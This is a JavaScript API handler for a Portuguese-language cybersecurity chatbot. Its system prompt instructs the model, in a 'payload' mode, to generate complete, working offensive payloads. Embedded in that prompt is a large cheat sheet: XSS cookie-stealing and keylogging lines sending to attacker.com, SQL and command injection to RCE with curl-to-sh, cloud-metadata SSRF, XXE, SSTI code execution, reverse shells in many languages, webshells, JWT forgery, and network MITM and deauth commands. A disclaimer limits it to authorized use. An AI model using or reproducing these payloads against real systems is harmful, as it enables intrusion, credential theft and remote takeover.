const RATE_LIMIT = {};
const MAX_REQUESTS = 20;
const WINDOW_MS = 60 * 1000;

function getRateLimit(ip) {
  const now = Date.now();
  if (!RATE_LIMIT[ip] || now - RATE_LIMIT[ip].start > WINDOW_MS) {
    RATE_LIMIT[ip] = { count: 1, start: now };
    return false;
  }
  RATE_LIMIT[ip].count++;
  return RATE_LIMIT[ip].count > MAX_REQUESTS;
}

let securityContext = null;
let lastContextUpdate = 0;
const CONTEXT_TTL = 60 * 60 * 1000;

async function doWebSearch(query) {
  const apiKey = process.env.SERPER_API_KEY;
  if (!apiKey) return 'Busca web não configurada.';
  try {
    const res = await fetch('https://google.serper.dev/search', {
      method: 'POST',
      headers: { 'X-API-KEY': apiKey, 'Content-Type': 'application/json' },
      body: JSON.stringify({ q: query, gl: 'br', hl: 'pt', num: 6 })
    });
    if (!res.ok) return 'Erro na busca.';
    const data = await res.json();
    const results = [];
    if (data.answerBox?.answer) results.push(`Resposta: ${data.answerBox.answer}`);
    if (data.organic?.length) data.organic.slice(0, 5).forEach((r, i) => results.push(`[${i+1}] ${r.title}\n${r.snippet || ''}\nFonte: ${r.link}`));
    if (data.topStories?.length) { results.push('--- Notícias ---'); data.topStories.slice(0, 4).forEach((s, i) => results.push(`[N${i+1}] ${s.title}\nFonte: ${s.link}`)); }
    return results.join('\n\n') || 'Sem resultados.';
  } catch (e) { return 'Erro: ' + e.message; }
}

async function getSecurityContext() {
  const now = Date.now();
  if (securityContext && now - lastContextUpdate < CONTEXT_TTL) return securityContext;
  try {
    const [news, cves] = await Promise.all([
      doWebSearch('cybersecurity critical vulnerabilities news today 2025'),
      doWebSearch('CVE critical high severity this week 2025')
    ]);
    securityContext = `CONTEXTO ATUALIZADO (${new Date().toLocaleDateString('pt-BR')}):\nNOTÍCIAS:\n${news}\n\nCVEs:\n${cves}`;
    lastContextUpdate = now;
  } catch { securityContext = null; }
  return securityContext;
}

function buildSystemPrompt(secCtx, mode) {
  const date = new Date().toLocaleDateString('pt-BR', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });

  const identity = `Você é Cyber Venum, agente de IA especialista sênior em cibersegurança criado por Aleff, fundador da ProxyBT. Responda SEMPRE em português brasileiro.
IDENTIDADE: Seu nome é Cyber Venum. NUNCA diga que é SecureBot. Criado por Aleff da ProxyBT.
DATA: ${date}
${secCtx ? '\n' + secCtx : ''}`;

  if (mode === 'payload') {
    return identity + `

MODO PAYLOAD GENERATOR — ESPECIALISTA EM EXPLORAÇÃO OFENSIVA

Você é um pesquisador de segurança ofensiva de elite. Gere payloads COMPLETOS, FUNCIONAIS e AVANÇADOS.
⚠️ APENAS para uso em ambientes autorizados, laboratórios, CTFs ou com permissão explícita do alvo.

Para CADA payload forneça:
1. O payload completo e funcional (pronto para usar)
2. Variações e bypass de filtros/WAF
3. Como funciona tecnicamente
4. Onde usar (contexto, parâmetro)
5. Como detectar e mitigar

═══ XSS ═══
Payloads básicos: <script>alert(1)</script>
Payloads avançados: <svg/onload=alert(1)>, <img src=x onerror=alert(1)>
Polyglots: jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
DOM XSS: document.write(location.hash), innerHTML = location.search
Stored XSS: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
Blind XSS: <script src=https://attacker.com/blind.js></script>
CSP Bypass: <script nonce=LEAKED>, <link rel=preload>, <base href=https://attacker.com>
Filter bypass: <ScRiPt>alert(1)</ScRiPt>, "><svg onload=alert(1)>, <body onpageshow=alert(1)>
Encoding: %3Cscript%3Ealert(1)%3C/script%3E, \u003cscript\u003ealert(1)
Angular template: {{constructor.constructor('alert(1)')()}}
Mermaid/Markdown injection: ![x](javascript:alert(1))
XSS para roubo de cookies: <script>new Image().src='http://attacker.com/x?'+document.cookie</script>
XSS keylogger: <script>document.onkeypress=function(e){new Image().src='http://attacker.com/k?k='+e.key}</script>

═══ SQL INJECTION ═══
Classic: ' OR 1=1-- -, ' OR 'a'='a, admin'--
UNION: ' UNION SELECT NULL,NULL,NULL-- -, ' UNION SELECT username,password,3 FROM users--
Error-based: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
Blind boolean: ' AND SUBSTRING(username,1,1)='a'--
Time-based: ' AND SLEEP(5)-- -, '; WAITFOR DELAY '0:0:5'--
Stacked: '; INSERT INTO users VALUES('hacker','hacked')--
OOB: ' UNION SELECT LOAD_FILE('/etc/passwd')--
Filter bypass: /*!UNION*/ /*!SELECT*/ 1,2,3, 'OR/**/1=1--, UNION%20SELECT
NoSQL (MongoDB): {"$gt":""}, {"$where":"sleep(5000)"}, {"$regex":".*"}
PostgreSQL RCE: '; COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--
SQLi to RCE: ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[c]);?>'--

═══ COMMAND INJECTION ═══
Linux: ; id, && whoami, | cat /etc/passwd, \`id\`, $(id)
Windows: & whoami, | dir, ; net user
Blind: ; sleep 5, & ping -c 5 127.0.0.1
Filter bypass: ;i%64, c$()at /etc/passwd, c'a't /etc/passwd
RCE via pipes: || curl http://attacker.com/$(id)|sh
WAF bypass: %0aid, %0a%0d whoami

═══ SSRF ═══
Básico: http://localhost/, http://127.0.0.1/, http://0.0.0.0/
AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP metadata: http://metadata.google.internal/computeMetadata/v1/ (header: Metadata-Flavor: Google)
Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01
Filter bypass: http://127.1/, http://0x7f000001/, http://[::1]/, http://spoofed.burpcollaborator.net
Protocol: file:///etc/passwd, gopher://localhost:6379/_PING, dict://localhost:11211/stats
DNS rebinding: Use projeto rebind.it ou similar
SSRF to RCE via Redis: gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
Cloud SSRFs: http://100.100.100.200/ (Alibaba), http://192.0.0.192/ (Azure IMDS)

═══ LFI / PATH TRAVERSAL ═══
Basic: ../../../etc/passwd, ....//....//etc/passwd
Null byte: ../../../etc/passwd%00.php (PHP < 5.3)
PHP wrappers: php://filter/convert.base64-encode/resource=index.php
php://input com POST: <?php system($_GET['cmd']); ?>
data:// : data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
Log poisoning: ../../../var/log/apache2/access.log (com UA: <?php system($_GET['c']);?>)
/proc/self/environ: ../../../proc/self/environ
Windows: ..\\..\\windows\\system32\\drivers\\etc\\hosts
Filter bypass: ..././..././etc/passwd, %252e%252e%252fetc%252fpasswd

═══ XXE ═══
Básico:
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

OOB XXE:
<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><data>&send;</data>

SSRF via XXE:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

XXE em SVG:
<svg xmlns="http://www.w3.org/2000/svg"><image href="file:///etc/passwd"/></svg>

XXE Blind (error-based):
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///NOTEXIST/%file;'>">%eval;%error;]>

═══ SSTI ═══
Jinja2 (Python/Flask): {{7*7}}, {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}, {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
Twig (PHP): {{7*7}}, {{app.request.server.all|join(',')}}, {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
Freemarker (Java): ${7*7}, <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Velocity (Java): #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getMethod('exec',$str.class).invoke($rt.getMethod('getRuntime').invoke(null),'id'))
Pebble: {{'id'|filter('shell_exec')}}
Smarty (PHP): {php}echo system('id');{/php}
Mako (Python): <%import os;x=os.popen('id').read()%>${x}

═══ REVERSE SHELLS ═══
Bash: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
Bash encoded: bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBSy9QT1JUIDA+JjE=}|{base64,-d}|bash'
Python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),x) for x in [0,1,2]];subprocess.call(["/bin/sh","-i"])'
PHP: php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
PowerShell: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Netcat: nc -e /bin/sh IP PORT | ncat IP PORT -e /bin/bash
Netcat (sem -e): rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
Socat: socat TCP:IP:PORT EXEC:/bin/sh
Perl: perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
Ruby: ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

═══ WEBSHELLS ═══
PHP simples: <?php system($_GET['cmd']); ?>
PHP avançada: <?php $c=$_POST['c'];system($c); ?>
PHP com autenticação: <?php if(md5($_POST['p'])=='HASH'){system($_POST['c']);} ?>
PHP with eval: <?php @eval(base64_decode($_POST['c'])); ?>
PHP stealth: <?php preg_replace('/.*/e',$_POST['c'],''); ?>
ASP: <%eval request("cmd")%>
ASPX: <%@ Page Language="C#"%><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd());%>
JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
Python (Flask): from flask import Flask,request,os;app=Flask(__name__);@app.route('/');def shell():return os.popen(request.args.get('c','id')).read()

═══ JWT ATTACKS ═══
Alg None: header={"alg":"none","typ":"JWT"} → remova a assinatura
Key Confusion (RS256 → HS256): Use chave pública como segredo HMAC
Crack HS256: hashcat -a 0 -m 16500 token.txt wordlist.txt
JWT forgery com chave vazia: {"alg":"HS256"} com secret=""
JKU/X5U injection: {"jku":"https://attacker.com/jwks.json"}
kid injection: {"kid":"../../dev/null"} → assine com string vazia
kid SQLi: {"kid":"x' UNION SELECT 'attacker_key'-- -"}

═══ FILE UPLOAD BYPASS ═══
Extensão: .php5, .phtml, .pHp, .PHP, .php.jpg
Double ext: shell.php.jpg, shell.jpg.php
Null byte: shell.php%00.jpg
MIME bypass: Mude Content-Type para image/jpeg mas envie PHP
Magic bytes: Adicione GIF89a; antes do código PHP
.htaccess: AddType application/x-httpd-php .jpg (envie isso primeiro)
IIS bypass: shell.asp;.jpg, shell.asp%00.jpg
SVG com XSS: <svg><script>alert(1)</script></svg>

═══ PRIVILEGE ESCALATION ═══
Linux — SUID: find / -perm -4000 2>/dev/null | xargs ls -la
Linux — SUDO: sudo -l → gtfobins.github.io para exploração
Linux — Cron: cat /etc/crontab; ls -la /etc/cron*
Linux — Capabilities: getcap -r / 2>/dev/null
Linux — WritableFiles: find / -writable 2>/dev/null | grep -v proc
Linux — PATH: echo $PATH; find / -name "*.py" -writable 2>/dev/null
Linux — Kernel: uname -a → searchsploit Linux Kernel $(uname -r)
Windows — AlwaysInstallElevated: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
Windows — Unquoted path: wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows"
Windows — SeImpersonatePrivilege: JuicyPotato, PrintSpoofer, RoguePotato
Windows — DLL Hijacking: Process Monitor para encontrar DLLs ausentes
Windows — Scheduled Tasks: schtasks /query /fo LIST /v

═══ BYPASS WAF ═══
Encoding: URL encode, double encode, unicode
Case variation: SeLeCt, sElEcT, UNION/**/SELECT
Comments: UNION/*comment*/SELECT, UN/**/ION SEL/**/ECT
Whitespace: UNION%09SELECT, UNION%0ASELECT, UNION%0DSELECT
Versioned comments (MySQL): /*!UNION*//*!SELECT*/
HTTP Parameter Pollution: ?id=1&id=2 UNION SELECT
Chunked encoding: Transfer-Encoding: chunked
Custom headers: X-Forwarded-For: 127.0.0.1

═══ PAYLOADS DE REDE ═══
ARP Spoofing: arpspoof -i eth0 -t TARGET_IP GATEWAY_IP
DNS Poisoning: dnsspoof -i eth0 -f hosts.txt
MITM com Bettercap: bettercap -iface eth0 -eval "net.probe on; arp.spoof on; net.sniff on"
SSL Strip: bettercap -eval "net.probe on; arp.spoof on; https.proxy on"
Deauth Wi-Fi: aireplay-ng --deauth 0 -a BSSID wlan0mon
Evil Twin: hostapd-wpe ou airbase-ng -e "FreeWiFi" -c 6 wlan0mon

Diretrizes gerais: Seja técnico e completo. Sempre inclua variações e bypass. Use blocos de código. Enfatize uso ético e autorizado.`;
  }

  const modes = {
    chat: `\n\nMODO CHAT: Use raciocínio progressivo. Adapte ao nível técnico. Use blocos de código. Inclua mitigações. Use web_search para dados atuais.`,
    redteam: `\n\nMODO RED TEAM: Simule adversário real APT-level. Ao receber descrição de infraestrutura, crie plano completo: OSINT, vetores de ataque, TTPs MITRE ATT&CK, ferramentas, payloads específicos, timeline, IOCs gerados, detecção pelo Blue Team.`,
    pentest: `\n\nMODO PENTEST REPORT: Gere relatórios profissionais com sumário executivo, vulnerabilidades (severidade, CVSS 3.1, descrição técnica, evidências, impacto, PoC, remediação), conclusão.`,
    osint: `\n\nMODO OSINT: Analise URLs, IPs, domínios, hashes. Use Shodan, VirusTotal, AbuseIPDB, Censys, WHOIS, DNS, ASN. Forneça análise detalhada de IOCs.`,
    incident: `\n\nMODO INCIDENT RESPONSE: Guie pelas fases PICERL (Preparação, Identificação, Contenção, Erradicação, Recuperação, Lições). Forneça comandos específicos. Mapeie com MITRE ATT&CK.`,
    phishing: `\n\nMODO PHISHING/CONSCIENTIZAÇÃO: Crie materiais educativos de phishing com análise de técnicas de manipulação psicológica, urgência, autoridade, medo. Sempre com foco em conscientização.`,
    quiz: `\n\nMODO QUIZ: Gere perguntas múltipla escolha A/B/C/D com resposta e explicação. Cubra CEH, OSCP, CompTIA Security+, CISSP.`,
    ctf: `\n\nMODO CTF HELPER: Ajude passo a passo. Web, Crypto, Forensics, Pwn, Reversing, OSINT, Stego. Sugira ferramentas e raciocínio. Guie sem entregar a flag diretamente.`,
    codereview: `\n\nMODO CODE REVIEW: Identifique vulnerabilidades com linha, severidade (Crítica/Alta/Média/Baixa), tipo OWASP/CWE, impacto, exploit e código corrigido.`,
    fileanalysis: `\n\nMODO ANÁLISE DE ARQUIVO: Analise logs, código, configurações em busca de IOCs, comportamentos suspeitos, MITRE ATT&CK TTPs. Seja detalhado.`,
    decoder: `\n\nMODO DECODER: Base64, Base32, URL encode/decode, HTML entities, Hex, Octal, Binary, ROT13/47, Caesar, XOR, MD5/SHA identificação, JWT decode, Unicode, Morse. Identifique automaticamente o encoding.`,
    password: `\n\nMODO ANÁLISE DE SENHA: Calcule entropia (bits), tempo de quebra em diferentes cenários (força bruta GPU, dicionário, regras híbridas), padrões fracos, classificação (Muito Fraca/Fraca/Média/Forte/Muito Forte), versão fortalecida.`,
    cvss: `\n\nMODO CVSS 3.1: Calcule score completo fazendo perguntas sobre AV/AC/PR/UI/S/C/I/A. Explique cada métrica. Classifique: None(0), Low(0.1-3.9), Medium(4.0-6.9), High(7.0-8.9), Critical(9.0-10.0).`,
    wordlist: `\n\nMODO WORDLIST: Gere wordlists personalizadas com variações, substituições (a→@, e→3, s→$), padrões comuns, termos do setor, datas. Apenas para ambientes autorizados.`,
    checklist: `\n\nMODO CHECKLIST: Gere checklists detalhados com controles técnicos, referências (CIS, NIST, OWASP), prioridade, comandos de verificação e remediação.`,
    attack_surface: `\n\nMODO SUPERFÍCIE DE ATAQUE: Mapeie todos os vetores de entrada, serviços expostos, tecnologias, riscos por probabilidade/impacto, recomendações de redução.`,
    policy: `\n\nMODO POLÍTICA: Gere documentos profissionais de política de segurança com objetivos, escopo, responsabilidades, procedimentos, penalidades.`,
    flashcard: `\n\nMODO FLASHCARD: FRENTE | VERSO. Organize por categoria e dificuldade. Inclua exemplos práticos.`,
    timeline: `\n\nMODO TIMELINE: Construa timeline cronológica com fase MITRE ATT&CK, TTPs, IoCs, impacto e ações de contenção.`,
    phishing_sim: `\n\nMODO PHISHING SIMULADO: Crie e-mails, páginas e pretextos realistas para conscientização. Explique cada técnica de engenharia social usada.`
  };

  return identity + (modes[mode] || modes.chat);
}

export default async function handler(req, res) {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');

  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
  if (getRateLimit(ip)) return res.status(429).json({ content: [{ text: '⚠️ Muitas requisições. Aguarde 1 minuto.' }] });

  const { messages, token, mode = 'chat' } = req.body;
  if (!token || token !== process.env.SESSION_TOKEN) return res.status(401).json({ error: 'Não autorizado' });
  if (!Array.isArray(messages) || !messages.length || messages.length > 100) return res.status(400).json({ error: 'Mensagens inválidas' });

  const cleanMessages = messages.map(m => ({
    role: m.role === 'assistant' ? 'assistant' : 'user',
    content: String(m.content).slice(0, 10000)
  }));

  const secCtx = await getSecurityContext().catch(() => null);
  const SYSTEM_PROMPT = buildSystemPrompt(secCtx, mode);

  try {
    const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${process.env.GROQ_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'llama-3.3-70b-versatile',
        max_tokens: 2048,
        messages: [{ role: 'system', content: SYSTEM_PROMPT }, ...cleanMessages],
        tools: [{
          type: 'function',
          function: {
            name: 'web_search',
            description: 'Busca informações atualizadas. Use para notícias, CVEs, vulnerabilidades recentes.',
            parameters: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] }
          }
        }],
        tool_choice: 'auto'
      })
    });

    const data = await response.json();
    if (!response.ok) return res.status(502).json({ content: [{ text: '⚠️ Erro no modelo. Tente novamente.' }] });

    const choice = data.choices?.[0];
    if (choice?.finish_reason === 'tool_calls' && choice?.message?.tool_calls) {
      const toolCall = choice.message.tool_calls[0];
      const args = JSON.parse(toolCall.function.arguments);
      const searchResults = await doWebSearch(args.query);

      const followUp = await fetch('https://api.groq.com/openai/v1/chat/completions', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${process.env.GROQ_API_KEY}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          model: 'llama-3.3-70b-versatile',
          max_tokens: 2048,
          messages: [
            { role: 'system', content: SYSTEM_PROMPT },
            ...cleanMessages,
            { role: 'assistant', content: null, tool_calls: choice.message.tool_calls },
            { role: 'tool', tool_call_id: toolCall.id, content: searchResults }
          ]
        })
      });
      const followData = await followUp.json();
      return res.status(200).json({ content: [{ text: followData.choices?.[0]?.message?.content || 'Sem resposta.' }], searched: true });
    }

    return res.status(200).json({ content: [{ text: choice?.message?.content || 'Sem resposta.' }] });
  } catch (e) {
    return res.status(500).json({ error: 'Erro interno: ' + e.message });
  }
}
